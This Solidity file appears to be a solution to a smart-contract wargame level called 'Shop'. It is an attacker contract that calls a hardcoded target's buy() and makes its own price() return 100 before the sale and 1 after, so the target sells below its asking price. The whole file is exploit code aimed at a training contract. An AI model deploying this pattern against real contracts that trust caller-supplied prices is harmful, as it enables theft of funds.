// SPDX-License-Identifier: MIT
pragma solidity ^0.8.*;

interface IsSold {
    function isSold() view external returns (bool);
}

contract Shop {

    address target = 0x49Ed39529C22B5964E02E986591F42bdfAA25Db2;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);

    function buy() public {

        bytes memory payload = abi.encodeWithSignature("buy()");
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }

    function price() external view returns (uint) {

        bool value = IsSold(target).isSold();

        if(!value){
            return 100;
        } else {
            return 1;
        }
    }
}